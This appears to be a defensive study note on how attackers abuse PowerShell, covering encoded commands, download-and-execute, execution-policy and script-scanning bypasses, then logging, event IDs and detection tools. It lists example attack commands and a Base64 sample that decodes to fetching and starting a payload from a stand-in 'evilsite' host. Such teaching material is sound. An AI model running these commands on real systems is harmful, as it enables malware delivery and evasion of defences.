**PowerShell** is a powerful Windows command-line and scripting language often abused by attackers to execute malicious payloads, maintain persistence, or evade detection — all without needing to write files to disk.

---

## 🎯 Why Attackers Use PowerShell

- Pre-installed on all modern Windows systems
- Executes commands and scripts directly in memory (fileless attacks)
- Easily obfuscated to evade detection
- Integrated with .NET, allowing rich functionality
- Trusted binary (signed by Microsoft)

---

## 🧰 Common PowerShell Attack Techniques

| Technique                   | Description                                                      | Example                                                  |
|-----------------------------|------------------------------------------------------------------|----------------------------------------------------------|
| **Encoded Commands**        | Base64-encoded payloads                                          | `powershell -enc <Base64>`                              |
| **Download & Execute**      | Pulls payloads from remote servers                              | `IEX (New-Object Net.WebClient).DownloadString(...)`     |
| **Script Obfuscation**      | Alters script structure or variable names                       | Used in `Invoke-Obfuscation`, manually or via frameworks |
| **Bypassing Execution Policy** | Overrides PowerShell restrictions                             | `-ExecutionPolicy Bypass`                               |
| **AMSI Bypass**             | Evades Windows script scanning engine                           | `Set-MpPreference -DisableScriptScanning $true`         |
| **Memory Injection**        | Injects shellcode or binaries into memory                       | PowerShell Empire, `Invoke-Shellcode`                   |
| **Credential Dumping**      | Extracts cached credentials or hashes                           | `Invoke-Mimikatz`                                        |
| **Lateral Movement**        | Executes remote commands on other systems                       | `Invoke-Command`, `PsExec`, WinRM                       |

---

## 🧱 Detection and Mitigation Controls

| Control Type     | Examples & Implementation                                |
|------------------|-----------------------------------------------------------|
| **Preventive**   | Constrained language mode, restrict execution policies    |
| **Detective**    | PowerShell logging (Module, ScriptBlock, Transcription)   |
| **Corrective**   | EDR auto-response, account lockout, reimage infected host |
| **Technical**    | Sysmon logging + SIEM alerting on PowerShell anomalies    |
| **Operational**  | Admin account auditing, least privilege enforcement       |
| **Managerial**   | Secure coding policies, tool usage training               |

---

## 🔬 Obfuscated Payload Example

```powershell
powershell -exec bypass -enc aQBmACgAKABnAGUAdAAtAGMAbwBuAHQAZQBuAHQALQBuAG8AdAAtAGUAbQBwAHQAeQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbABzAGkAdABlAC8AcA
BhAHkAbABvAGEAZAAuAGUAeABlACkAKQB7AHMAdABhAHIAdAAgAHAAYQB5AGwAbwBhAGQALgBlAHgAZQB9AA==
```

This payload is Base64 encoded. Logging tools like Sysmon + PowerShell auditing can capture and decode it.

## ⚔️ Red vs Blue Team Insight

- **Red Team**: Uses frameworks like Empire, Nishang, PowerSploit, and `Invoke-Obfuscation`.
- **Blue Team**: Monitors for abnormal command-line usage, encoded strings, and script blocks.

---

## 🛠 Tools for Defense

- **Sysmon** – Track PowerShell parent-child process creation
- **Defender for Endpoint / ATP** – Detect AMSI bypass, encoded payloads
- **Splunk / ELK / Sentinel** – Analyze logs for behavior patterns
- **AppLocker / WDAC** – Whitelist/blacklist PowerShell scripts

---

## 📋 Key Event IDs to Monitor

|Event ID|Description|
|---|---|
|**4104**|PowerShell ScriptBlock logging|
|**4688**|Process creation (cmd, powershell.exe)|
|**7036**|Service state changes (may hide PowerShell)|

---

## 🗂 Related Topics

- [[Defense Evasion Techniques]]
- [[Living off the Land Techniques]]
- [[Endpoint Detection & Response (EDR)]]
- [[SIEM & Log Analysis]]
- [[Windows Event IDs]]
- [[Obfuscation]]

---

## 🏷 Tags

#powershell #lolbins #fileless_malware #obfuscation #attack_techniques #defense_evasion #redteam #blueteam #edr #scripting #windows